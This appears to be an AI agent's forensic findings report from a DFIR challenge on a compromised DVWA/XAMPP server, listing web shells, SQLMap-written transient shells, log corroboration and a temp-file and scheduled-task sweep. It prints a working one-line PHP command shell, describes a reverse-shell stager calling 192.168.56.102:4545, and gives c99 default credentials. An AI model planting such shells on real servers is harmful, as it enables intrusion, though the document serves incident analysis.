# Leftovers and malware findings

Agent: sf4b203  
Seat: leftovers and malware  

## Scope and method

I triaged the web root, temp/profile locations, scheduled-task locations, and related web/server logs from the NTFS image at offset `2048`.

Primary evidence used:

- `catalog/s4a-challenge4/p2048/filelist.txt`
- `catalog/s4a-challenge4/p2048/timeline.csv`
- extracted files under `work/sf4b203/extracted/`

Main commands:

- `grep -Ein 'c99|webshell|phpshell|uploads/abc|Windows/System32/Tasks|Windows/Tasks|Prefetch' catalog/s4a-challenge4/p2048/filelist.txt`
- `grep '^2015-09-03T07:' catalog/s4a-challenge4/p2048/timeline.csv | grep '/xampp/'`
- `icat -o 2048 inputs/s4a-challenge4 <inode>` for specific artifacts
- `unzip -l work/sf4b203/extracted/webshells.zip`
- `exiftool work/sf4b203/extracted/ad_driver.sys`

Time-zone note:

- `timeline.csv` is UTC.
- Apache `access.log` timestamps are `-0700`.
- `php_error_log` timestamps are `Europe/Berlin`.

## Confirmed attacker leftovers in the web root

| Artifact | Proof | SHA-256 / content | Why it matters |
| --- | --- | --- | --- |
| `/xampp/htdocs/DVWA/hackable/uploads/phpshell.php` | inode `62330-128-3`; `2015-09-03T07:10:15Z` in `timeline.csv` | `08245eeb54a5d973b20a82e03d82556a693f5c63310e01a2f492b78dda132a99`; contents are `<?php system($_GET["cmd"]); ?>` from `work/sf4b203/extracted/phpshell.php` | Simple GET-parameter command shell. |
| `/xampp/htdocs/DVWA/webshells.zip` | inode `62331-128-1`; `2015-09-03T07:14:48Z` in `timeline.csv` | `bdae3070d4d9a483a8f08db4d16c9100723dea6fba3a7e53cbf249851bad99ee`; `unzip -l` shows `c99.php` and `webshell.php` | Archive used to stage multiple web shells. |
| `/xampp/htdocs/DVWA/webshells/` | inode `62332-144-1`; `2015-09-03T07:14:51Z` in `timeline.csv` | directory only | Leftover directory created during web-shell staging. |
| `/xampp/htdocs/DVWA/c99.php` | inode `62333-128-3`; file present in `filelist.txt`; `2015-09-03T07:20:45Z` modified in `timeline.csv` | `4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c`; header identifies `c99shell.php v.1.0 beta`; default creds in source are `c99` / `c99` | Full-featured interactive PHP web shell. |
| `/xampp/htdocs/DVWA/webshell.php` | inode `62334-128-1`; `2015-09-03T07:14:57Z` content-change in `timeline.csv` | `794f25b47b4773f6749b0f607f906e5181545eca7835a927c9a197c94c3fd74b`; contents are `<?php system($_GET["cmd"]); ?>` from `work/sf4b203/extracted/webshell.php` | Second simple command shell. |
| `/xampp/htdocs/DVWA/hackable/uploads/abc` | inode `62335-144-1`; `2015-09-03T07:17:58Z` in `timeline.csv` | directory only | Matches attacker command executed through `phpshell.php` (`mkdir abc`). |
| `/xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` | inode `62337-128-4`; `2015-09-03T07:31:30Z` in `timeline.csv` | `2e77d2db6ffba49be0ccf3850ee23de61b289d1e2dfee5b79e4d04563c42a1f7`; contents connect to `192.168.56.102:4545` and `eval()` the received payload | Reverse-shell stager / loader. |

## Transient shells preserved by Apache access.log

The attacker also used short-lived shells that were created and removed quickly enough that they do not remain as normal files in the current file list, but they are still visible in `work/sf4b203/extracted/access.log`.

### SQLMap file-write shell cycle 1

From `sed -n '7595,7665p' work/sf4b203/extracted/access.log`:

- `02/Sep/2015:04:25:52 -0700`: `sqlmap/1.0-dev-nongit-20150902` issues SQL injection with `INTO OUTFILE '/xampp/htdocs/tmpukudk.php'`
- then requests `/tmpukudk.php`
- then POSTs to it with `Python-urllib/2.7`
- then uses `/tmpbiwuc.php?cmd=echo command execution test`
- then runs deletion commands against both `tmpukudk.php` and `tmpbiwuc.php`

This is direct proof that SQL injection was used to write a web shell and obtain command execution.

### SQLMap file-write shell cycle 2

The same log excerpt also shows a second cycle:

- `02/Sep/2015:23:52:24 -0700`: SQLMap writes `/xampp/htdocs/tmpudvfh.php`
- then requests `/tmpudvfh.php`
- then POSTs to it
- then uses `/tmpbrjvl.php?cmd=echo command execution test`
- later deletes both files

## Access-log evidence of shell use

From `work/sf4b203/extracted/access.log`:

- `03/Sep/2015:00:15:58 -0700`: `GET /dvwa/hackable/uploads/phpshell.php`
- `03/Sep/2015:00:16:03 -0700`: `GET /dvwa/hackable/uploads/phpshell.php?dir`
- `03/Sep/2015:00:16:13 -0700`: `GET /dvwa/hackable/uploads/phpshell.php?cmd=dir`
- `03/Sep/2015:00:17:49 -0700`: `GET /dvwa/hackable/uploads/phpshell.php?cmd=dir C:\`
- `03/Sep/2015:00:17:58 -0700`: `GET /dvwa/hackable/uploads/phpshell.php?cmd=mkdir abc`
- `03/Sep/2015:00:19:32 -0700`: `GET /dvwa/c99.php`
- `03/Sep/2015:00:20:59 -0700`: repeated `GET /dvwa/c99.php?act=img...` requests that match c99 shell UI assets
- `03/Sep/2015:00:21:28 -0700` and `00:21:37 -0700`: `POST /dvwa/c99.php?act=cmd`
- `03/Sep/2015:00:31:54 -0700`: `GET /dvwa/hackable/uploads/phpshell2.php`

The source IP in these requests is consistently `192.168.56.102`.

## PHP error-log corroboration

`work/sf4b203/extracted/php_error_log` corroborates execution of these shells:

- `03-Sep-2015 09:15:58 Europe/Berlin`: `phpshell.php` called without `cmd`
- `03-Sep-2015 09:16:03 Europe/Berlin`: same again
- `03-Sep-2015 09:18:58 Europe/Berlin`: same again
- `03-Sep-2015 09:19:32 Europe/Berlin`: parse error when `C:\xampp\htdocs\DVWA\c99.php` is executed

These entries line up with the Apache access-log requests to `phpshell.php` and `c99.php`.

## Temp/profile leftovers

### Deleted `c99 (2).php` in Administrator temp

`timeline.csv` contains:

- `2015-09-03T07:20:14Z ... /Users/Administrator/AppData/Local/Temp/c99 (2).php (deleted)`

`istat -o 2048 inputs/s4a-challenge4 62338` confirms MFT entry `62338` for deleted file `c99 (2).php` under parent entry `229` (`Users/Administrator/AppData/Local/Temp`).

This is strong evidence that a second local copy of the c99 payload existed in the Administrator temp area, but because the file is deleted and its clusters are unallocated, I do **not** rely on my extracted bytes as authoritative content for that temp file.

### `ad_driver.sys` is likely responder, not attacker, residue

`/Users/Administrator/AppData/Local/Temp/ad_driver.sys` appears in `timeline.csv` at `2015-09-03T10:04:05Z`.  
`exiftool work/sf4b203/extracted/ad_driver.sys` identifies it as:

- Company: `AccessData Corporation`
- Product: `AccessData Memory and Disk driver`
- Version: `2.13.0.0`

This looks like a forensic-acquisition/response artifact, not attacker malware.

Hash: `11a707d5115e55649fb1964cda455a1f74c21c4877f745ed225b961f5acdf2f8`

## Scheduled tasks, services, and prefetch sweep

### Scheduled tasks

A path sweep found only the normal task locations:

- `Windows/System32/Tasks/...` (Microsoft task tree only)
- `Windows/Tasks/SA.DAT`
- `Windows/Tasks/SCHEDLGU.TXT`

I did **not** find attacker-named XML task files or `.job` files in the file list.

Evidence:

- `grep -EIn 'Windows/System32/Tasks|Windows/Tasks' catalog/s4a-challenge4/p2048/filelist.txt`
- `icat -o 2048 inputs/s4a-challenge4 30754` for `SCHEDLGU.TXT`

### Prefetch

`grep -EIn '(^|/|\t)Windows/Prefetch|/Prefetch/' catalog/s4a-challenge4/p2048/filelist.txt` returned no hits, so I found no prefetch artifacts to support execution tracing from disk.

### Services

I did not find obviously attacker-dropped service binaries in the specific leftover paths I swept. Service-install provenance should still be checked against event ID `7045` and service registry keys by the accounts/software seats.

## Bottom line for report use

Confirmed attacker leftovers preserved on disk/logs are:

1. `C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php`
2. `C:\xampp\htdocs\DVWA\webshells.zip`
3. `C:\xampp\htdocs\DVWA\webshells\`
4. `C:\xampp\htdocs\DVWA\c99.php`
5. `C:\xampp\htdocs\DVWA\webshell.php`
6. `C:\xampp\htdocs\DVWA\hackable\uploads\abc\`
7. `C:\xampp\htdocs\DVWA\hackable\uploads\phpshell2.php`
8. Access-log-only transient shells: `tmpukudk.php`, `tmpbiwuc.php`, `tmpudvfh.php`, `tmpbrjvl.php`
9. Deleted temp copy `C:\Users\Administrator\AppData\Local\Temp\c99 (2).php` (filename/timeline evidence only)

The web-shell set shows multiple levels of post-exploitation capability:

- simple one-liner command execution (`phpshell.php`, `webshell.php`)
- a full c99 interactive shell (`c99.php`)
- a reverse-shell stager (`phpshell2.php`)
- transient SQLMap-written shells proving SQLi-to-RCE via file write
